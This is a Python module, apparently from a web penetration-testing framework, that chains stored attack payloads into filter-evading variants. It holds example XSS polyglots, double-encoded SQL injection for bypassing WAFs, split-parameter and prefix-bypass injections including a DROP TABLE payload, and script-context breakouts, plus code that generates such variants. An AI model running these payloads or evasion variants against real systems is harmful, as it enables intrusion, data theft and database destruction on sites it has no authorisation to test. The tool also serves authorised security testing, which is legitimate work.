"""U-FORGE-9 — The Chaining Engine.

Chains payloads so they work across contexts (spec corpora verbatim).
Every variant keeps the original payload's attribution (FORGE-L-3
ATTRIBUTION_IS_SACRED) and is a NormalizedPayload, not a bare string,
so it flows through the same indexer/query paths as ingested corpus.
"""
from __future__ import annotations

import dataclasses
import hashlib
import urllib.parse

from webpent.forge.schemas import NormalizedPayload

# Spec corpus, verbatim structure (U-FORGE-9).
CHAIN_TYPES: dict[str, dict] = {
    "polyglot": {
        "description": "Works in multiple injection contexts",
        "example": "javascript:alert(1)//",
        "contexts": ["javascript", "url"],
    },
    "double_encoding": {
        "description": "Bypasses single-decode WAF filtering",
        "example": "%2527%2520OR%25201%253D1",
        "works_against": ["waf_that_decodes_once"],
    },
    "split_payload": {
        "description": "Distributes payload across parameters",
        "example": "?a='&b=OR 1=1",
        "contexts": ["multiple_params"],
    },
    "prefix_bypass": {
        "description": "Benign prefix defeats naive signature checks",
        "example": "safe'; DROP TABLE--",
    },
    "context_break": {
        "description": "Breaks out of the current HTML context",
        "example": "</script><script>alert(1)</script>",
        "contexts": ["html_in_script"],
    },
}


def _variant(origin: NormalizedPayload, chain_type: str, raw: str,
             is_polyglot: bool = False,
             target_context: tuple = ()) -> NormalizedPayload:
    variant_id = hashlib.sha256(
        f"chain|{chain_type}|{origin.payload_id}|{raw}".encode()
    ).hexdigest()[:16]
    attribution = dataclasses.replace(
        origin.attribution, payload_id=variant_id) \
        if origin.attribution is not None else None
    return NormalizedPayload(
        payload_id=variant_id,
        family=origin.family,
        subfamily=f"chain_{chain_type}",
        raw=raw,
        encoded_variants=(),
        target_tech=origin.target_tech,
        target_waf=origin.target_waf,
        target_context=target_context or origin.target_context,
        complexity=origin.complexity,
        source="forge-chain",
        attribution=attribution,
        quality_score=origin.quality_score,
        novelty_score=origin.novelty_score,
        is_polyglot=is_polyglot,
        chains_with=(chain_type,),
        requires=origin.requires,
    )


def chain(payload: NormalizedPayload, chain_type: str,
          raw_override: str | None = None) -> list[NormalizedPayload]:
    """Apply a documented chain to a payload; returns its variants."""
    if chain_type not in CHAIN_TYPES:
        raise KeyError(chain_type)
    raw = raw_override if raw_override is not None else payload.raw

    if chain_type == "polyglot":
        return [_variant(payload, chain_type, f"javascript:{raw}//",
                         is_polyglot=True,
                         target_context=("javascript", "url"))]
    if chain_type == "double_encoding":
        twice = urllib.parse.quote(
            urllib.parse.quote(raw, safe=""), safe="")
        return [_variant(payload, chain_type, twice)]
    if chain_type == "split_payload":
        if " " in raw:
            parts = raw.split(" ", 1)
        else:
            mid = (len(raw) + 1) // 2
            parts = [raw[:mid], raw[mid:]]
        return [_variant(payload, chain_type, part,
                         target_context=("multiple_params",))
                for part in parts]
    if chain_type == "prefix_bypass":
        return [_variant(payload, chain_type, f"safe{raw}")]
    if chain_type == "context_break":
        if "<script>" in raw:
            broken = raw.replace("<script>", "</script><script>", 1)
        else:
            broken = f"</script>{raw}"
        return [_variant(payload, chain_type, broken,
                         target_context=("html_in_script",))]
    raise KeyError(chain_type)
